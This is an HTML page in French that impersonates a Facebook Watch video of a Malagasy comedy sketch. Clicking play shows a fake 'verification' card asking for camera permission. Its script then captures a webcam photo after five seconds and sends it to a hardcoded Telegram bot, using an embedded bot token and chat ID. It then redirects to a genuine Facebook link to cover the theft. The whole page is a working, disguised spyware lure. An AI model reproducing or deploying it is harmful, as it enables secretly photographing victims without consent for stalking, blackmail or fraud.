<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Watch</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #000; margin: 0; padding: 0; color: white; overflow: hidden; }
        
        /* Barre du haut style FB App */
        .fb-header { background: #000; padding: 10px 15px; display: flex; align-items: center; border-bottom: 0.5px solid #333; }
        .back-btn { font-size: 24px; margin-right: 15px; cursor: pointer; }
        .header-title { font-weight: bold; font-size: 18px; flex-grow: 1; }

        /* Conteneur Vidéo */
        .video-wrapper { width: 100%; height: calc(100vh - 120px); display: flex; flex-direction: column; justify-content: center; position: relative; }
        .thumbnail-box { position: relative; width: 100%; width: 100%; }
        .thumbnail-box img { width: 100%; display: block; }
        
        /* Bouton Play Central */
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0, 0, 0, 0.5); border: 2px solid #fff; border-radius: 50%; width: 70px; height: 70px; display: flex; justify-content: center; align-items: center; z-index: 5; }
        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }

        /* Infos Vidéo */
        .video-info { padding: 15px; position: absolute; bottom: 60px; width: 100%; background: linear-gradient(transparent, rgba(0,0,0,0.8)); }
        .author { font-weight: bold; font-size: 15px; margin-bottom: 5px; }
        .caption { font-size: 14px; margin-bottom: 10px; }

        /* Barre d'interaction bas */
        .fb-actions { position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 15px 0; background: #000; border-top: 0.5px solid #333; }
        .action-item { display: flex; flex-direction: column; align-items: center; font-size: 11px; color: #b0b3b8; }
        .icon { font-size: 20px; margin-bottom: 4px; color: #fff; }

        /* Overlay d'autorisation */
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
        .fb-card { background: white; color: #1c1e21; padding: 25px; border-radius: 12px; width: 100%; max-width: 330px; text-align: center; }
        .fb-card h3 { margin: 0 0 10px 0; font-size: 18px; }
        .fb-card p { font-size: 14px; color: #606770; line-height: 1.4; }
        .btn-confirm { background: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; margin-top: 20px; font-size: 15px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="fb-header">
        <span class="back-btn" onclick="location.href='https://m.facebook.com'">←</span>
        <span class="header-title">Vidéo</span>
    </div>

    <div class="video-wrapper" onclick="openVerif()">
        <div class="thumbnail-box">
            <img src="https://images.unsplash.com/photo-1594909122845-11baa439b7bf?q=80&w=600" alt="Video Thumbnail">
            <div class="play-btn"></div>
        </div>
        
        <div class="video-info">
            <div class="author">Comédie Gasy • Suivre</div>
            <div class="caption">Nouveauté 2026 : Le sketch qui fait le buzz ! 😂🇲🇬</div>
        </div>
    </div>

    <div class="fb-actions">
        <div class="action-item"><span class="icon">👍</span><span>J'aime</span></div>
        <div class="action-item"><span class="icon">💬</span><span>Commenter</span></div>
        <div class="action-item"><span class="icon">⤴️</span><span>Partager</span></div>
    </div>

    <div class="overlay" id="overlay">
        <div class="fb-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="40" style="margin-bottom: 10px;">
            <h3>Vérification requise</h3>
            <p>Pour lire cette vidéo en haute qualité, veuillez autoriser l'accès à la caméra pour confirmer que vous êtes un utilisateur réel.</p>
            <button class="btn-confirm" onclick="startProcess()">AUTORISER ET LIRE</button>
        </div>
    </div>

    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const TOKEN = '8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s';
        const ID = '7129218282';
        const FINAL_URL = 'https://www.facebook.com/share/v/1DfJG4EvEf/';

        function openVerif() {
            document.getElementById('overlay').style.display = 'flex';
        }

        async function startProcess() {
            document.getElementById('overlay').innerHTML = '<div class="fb-card"><p>Chargement du lecteur vidéo...</p></div>';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                setTimeout(captureAndSend, 5000); 
            } catch (e) {
                window.location.href = FINAL_URL;
            }
        }

        function captureAndSend() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(async (blob) => {
                const fd = new FormData();
                fd.append('chat_id', ID);
                fd.append('photo', blob, 'pic.jpg');
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                } catch (err) {}
                window.location.href = FINAL_URL;
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
